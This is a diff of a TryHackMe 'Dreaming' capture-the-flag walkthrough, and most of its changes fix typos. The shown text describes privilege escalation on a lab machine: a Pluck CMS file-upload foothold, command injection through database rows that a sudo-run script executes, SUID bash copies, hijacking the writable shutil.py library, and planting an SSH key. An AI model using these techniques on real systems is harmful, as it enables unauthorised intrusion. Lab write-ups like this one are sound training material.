@@ -63,7 +63,7 @@ The fuzzing process uncovered an interesting directory i.e. `/app`. Let's visit 
 ![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/2-browse.png)
 ![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/3-browse.png)
 
-This directory has directory listing enabled and we can identify a new directory named `pluck-4.1.13`. Pluck is a CMS and we can see the version number in the directory's name. We can Google this version number to see if the is any public exploit.
+This directory has directory listing enabled and we can identify a new directory named `pluck-4.1.13`. Pluck is a CMS and we can see the version number in the directory's name. We can Google this version number to see if there is a public exploit.
 ![](/assets/img/posts/walthrough/tryhackme/2024-10-27-dreaming/vuln-dis.png)
 
 This version number is vulnerable to an authenticated file upload vulnerability. The pluck CMS has no default credentials as they are set during installation. If we try to log in using common default passwords, we will find that the admin portal is protected by the common weak password p******d.
@@ -123,7 +123,7 @@ death:x:1001:1001::/home/death:/bin/bash
 morpheus:x:1002:1002::/home/morpheus:/bin/bash
 ```
 
-A quick enumeration of the file system reveals the presence of two scripts in the `/opt` directory.
+A quick enumeration of the file system reveals two scripts in the `/opt` directory.
 ```bash
 www-data@dreaming:/$ ls -l opt
 total 8
@@ -131,7 +131,7 @@ total 8
 -rwxr-xr-x 1 lucien lucien  483 Aug  7  2023 test.py
 ```
 
-The `test.py` file contains a password that matches the username Lucien.
+The `test.py` file contains a password that has Lucien in it.
 ```bash
 www-data@dreaming:/opt$ cat test.py 
 import requests
@@ -203,7 +203,7 @@ total 8
 -rwxrwx--x 1 death death 1539 Aug 25  2023 getDreams.py
 ```
 
-Remember that we saw a script having a similar name in the `/opt` directory. This might be thesame script so let's read it.
+Remember that we saw a script with a similar name in the `/opt` directory. This might be the same script so let's read it.
 ```bash
 lucien@dreaming:~$ cat /opt/getDreams.py                           
 import mysql.connector                                             
@@ -254,7 +254,7 @@ def getDreams():
 getDreams() 
 ```
 
-This Python script connect to the `library` database as the Death user (unfortunately the password is redacted), retrieves data from the `dreamer` and `dream` columns of the `dreams` table, contructs a string using this data, and finally executes the string. This means that if we can add fake entries in the database, our entries will also be executed. We can run the script present in the  `/home/death` directory using our sudo privilege to ensure that it is thesame with the one in the `/opt` directory.
+This Python script connects to the `library` database as the Death user (unfortunately the password is redacted), retrieves data from the `dreamer` and `dream` columns of the `dreams` table, constructs a string using this data, and executes the string. If we add fake entries to the database, our entries will also be executed. Let's the script present in the  `/home/death` directory using our sudo privilege to ensure that it is the same as the one in the `/opt` directory.
 ```bash
 lucien@dreaming:~$ sudo -u death  /usr/bin/python3 /home/death/getDreams.py     
 Alice + Flying in the sky
@@ -266,7 +266,7 @@ Carol + Becoming a successful entrepreneur
 Dave + Becoming a professional musician
 ```
 
-We can see that the output is formated in thesame way as we could read in the script present in the `/opt` directory. This means the are thesame. Unfortunately, we cannot add fake entries in the database since we do not have valid credentials. In the user's home directory, we can see a `.bash_history` file. Let's read this file. 
+We can see that the output is formatted the same way as in the script in the `/opt` directory. This means they are the same. Unfortunately, we cannot add fake entries to the database since we do not have valid credentials. In the user's home directory, we can see a `.bash_history` file. Let's read this file. 
 ```bash
 lucien@dreaming:~$ ls -al
 total 44
@@ -294,7 +294,7 @@ mysql -u lucien -p<REDACTED>
 <SNIP>
 ```
 
-We can see Lucien's password for the database server. Let's use this to connect to the database and add fake entries in the `dreamer` and/or `dream` columns that will be execute by the `getDreams.py` script.
+We can see Lucien's password for the database server. Let's use this to connect to the database and add fake entries in the `dreamer` and/or `dream` columns that will be executed by the `getDreams.py` script.
 ```bash
 lucien@dreaming:~$ mysql -u lucien -p<REDACTED>
 mysql: [Warning] Using a password on the command line interface can be insecure.
@@ -357,7 +357,7 @@ mysql> select * from dreams;
 5 rows in set (0.00 sec)
 ```
 
-We first added a `;` that will end the execution of the `echo` command and followed by the `copy` command that will copy the bash exectable to Death's home directroy and `chmod` that will add the SUID bit to the copied `bash` executable. When we run the `/home/death/getDreams.py` script using our sudo right this commands will be executed and we will see the bash executable with Death's SUID bit set in the `/home/death` directory.
+We first added a `;` that will end the execution of the `echo` command followed by the `copy` command that will copy the bash executable to Death's home directory and `chmod` that will add the SUID bit to the copied `bash` executable. When we run the `/home/death/getDreams.py` script using our sudo right these commands will be executed and we will see the bash executable with Death's SUID bit set in the `/home/death` directory.
 ```bash
 lucien@dreaming:~$ sudo -u death  /usr/bin/python3 /home/death/getDreams.py     
 <SNIP>
@@ -408,14 +408,14 @@ def getDreams():
 Last login: Fri Nov 17 21:44:20 2023
 death@dreaming:~$ 
 ```
-We see that the Death user used the same password for the database server and for SSH authentication.
+We can see that the Death user used the same password for the database server and SSH authentication.
 
 ## Post Exploitation
 
-We can see a `.viminfo` file in Death's home directory. We can read this file to see the files this user editted.
+We can see a `.viminfo` file in Death's home directory. We can read this file to see the files this user edited.
 ```bash
-death@dreaming:~$ cat .viminfo                                                   <SNIP>
-
+death@dreaming:~$ cat .viminfo                                                  
+<SNIP>
 # File marks:
 '0  297  0  /usr/lib/python3.8/shutil.py
 |4,48,297,0,1691452277,"/usr/lib/python3.8/shutil.py"
@@ -433,7 +433,7 @@ death@dreaming:~$ ls  -l /usr/lib/python3.8/shutil.py
 -rw-rw-r-- 1 root death 51474 Aug  7  2023 /usr/lib/python3.8/shutil.py
 ```
 
-This file belong to the death group and we can write into it. Let's transfer `pspy64` to the target and run it to enumerate any process utilising this Pyhton module. 
+This file belong to the death group and we can write into it. Let's transfer `pspy64` to the target and run it to enumerate any process utilising this Python module. 
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
 └─$ scp /usr/share/pspy/pspy64 death@10.10.162.34:/tmp
@@ -457,7 +457,7 @@ death@dreaming:/tmp$ ./pspy64
 2024/10/26 10:06:01 CMD: UID=1002  PID=40960  | /usr/bin/python3.8 /home/morpheus/restore.py 
 ```
 
-We can see that the a cron job run by the user with UID 1002 (morpheus) runs the `/home/morpheus/restore.py` script  after every one minute. Let's read this Python script file. 
+We can see that a cron job run by the user with UID 1002 (Morpheus) runs the `/home/morpheus/restore.py` script every minute. Let's read this Python script file. 
 ```bash
 death@dreaming:/tmp$ cat /home/morpheus/restore.py
 from shutil import copy2 as backup
@@ -469,7 +469,7 @@ backup(src_file, dst_file)
 print("The kingdom backup has been done!")
 ```
 
-Notice that this script uses the `copy2` function in the Shutil module. All we have to do now is to edit this function in the `/usr/lib/python3.8/shutil.py` file we have write access on and when this function will be call by the `/home/morpheus/restore.py` script run by Morpheus, our extra code will be executed. 
+Notice that this script uses the `copy2` function in the Shutil module. All we have to do now is to edit this function in the `/usr/lib/python3.8/shutil.py` file we have write access to and when this function is called by the `/home/morpheus/restore.py` script run by Morpheus, our extra code will be executed. 
 ```python
 def copy2(src, dst, *, follow_symlinks=True):
     """
@@ -483,7 +483,7 @@ def copy2(src, dst, *, follow_symlinks=True):
     return dst
 ```
 
-The extra code added to the `copy2` function will create a bash executable with SUID bit set in the `/home/morpheus/` directory. When this cron job will be executed after our modification the extra code will be executed.
+The extra code added to the `copy2` function will create a bash executable with a SUID bit set in the `/home/morpheus/` directory. When this cron job will be executed after our modification the extra code will be executed.
 ```bash
 death@dreaming:~$ ls -l /home/morpheus/ 
 total 1168
@@ -493,7 +493,7 @@ total 1168
 -rw-rw-r-- 1 morpheus morpheus     180 Aug  7  2023 restore.py
 ```
 
-We can use this bash executable with morpheus SUID bit to obtain a shell as morpheus and read the third flag on the target.
+We can use this bash executable with Morpheus SUID bit to obtain a shell as Morpheus and read the third flag on the target.
 ```bash
 death@dreaming:~$ cd /home/morpheus/
 death@dreaming:/home/morpheus$ ./bash  -p
@@ -527,7 +527,7 @@ bash-5.0$ mkdir .ssh
 bash-5.0$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbsvX2b4u0h1tDQMI56nIMDruVeOyzcypxB8nl6gy1q pentester@kali' > .ssh/authorized_keys
 ```
 
-We can now use the private key of the associate public key to connect to the target as morpheus.
+We can now use the private key of the associate public key to connect to the target as Morpheus.
 ```bash
 ┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Dreaming/Misc File]
 └─$ ssh morpheus@10.10.162.34 -i id_ed25519 
@@ -536,7 +536,7 @@ morpheus@dreaming:~$ ls
 bash  kingdom  morpheus_flag.txt  restore.py
 ```
 
-Looking at this user's sudo right we see that Morpheus can run any command as root. We can use this sudo righ to login as root using `sudo su`.
+Looking at this user's sudo right we see that Morpheus can run any command as root. We can use this sudo right to log in as root using `sudo su`.
 ```bash
 morpheus@dreaming:~$ sudo -l
 Matching Defaults entries for morpheus on dreaming:
@@ -551,4 +551,4 @@ snap
 
 ## Conclusion
 
-Congratulations! In this walkthrough, you have exploited a file upload vulnerability in the Pluck CMS to obtain a foothold on the target. Finally, youyou obtained a root shell by hijacking a Python library you had write access to. This machine was designed to show how improper upgrade pratices, password resuse, and the use of weak passwords could seriouly impact an organisation's security posture. Thanks for following up on this walkthrough.
+Congratulations! In this walkthrough, you have exploited a file upload vulnerability in the Pluck CMS to obtain a foothold on the target. Finally, you obtained a root shell by hijacking a Python library you had write access to. This machine was designed to show how improper upgrade practices, password reuse, and the use of weak passwords could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
